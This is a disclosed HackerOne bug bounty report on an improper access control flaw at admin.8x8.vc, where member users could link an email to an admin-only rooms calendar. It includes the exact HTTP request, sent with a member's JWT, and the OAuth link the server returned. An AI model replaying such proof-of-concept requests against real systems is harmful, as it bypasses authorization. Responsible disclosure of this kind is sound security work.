---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1486310'
original_report_id: '1486310'
title: 'admin.8x8.vc: Member users with no permission can integrate email to connect
  calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..'
weakness: Improper Access Control - Generic
team_handle: 8x8-bounty
created_at: '2022-02-20T06:51:48.884Z'
disclosed_at: '2023-02-15T06:35:41.593Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 39
asset_identifier: '*.8x8.vc'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..

## Metadata

- HackerOne Report ID: 1486310
- Weakness: Improper Access Control - Generic
- Program: 8x8-bounty
- Disclosed At: 2023-02-15T06:35:41.593Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Dear Team,

Greetings!!!

I have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2

Steps to reproduce
**Step1**: Member users do not have access to the room's area.
Use {F1625870}

**Step2**: Admin users can add their email to sync calendars from this area.
Use {F1625869}

**Step3**: From member user's JWT send a request to below endpoint
Use ██████

```
GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
Host: admin.8x8.vc
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://admin.8x8.vc/
Content-Type: application/json
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Authorization: <Member user's JWT>
```

**Step4**: You will receive the Link as below from the above endpoint: 
```
{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
```

**Step5**: Now use this link and complete the OAuth sign up. (There is no validation and the application will allow you to add your email)
Use {F1625872}

**Step6**: Member user successfully added his/her email into admin's room area
Use ███

Best regards,
Emperor

## Impact

- Member users with no permission can integrate email to connect calendar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
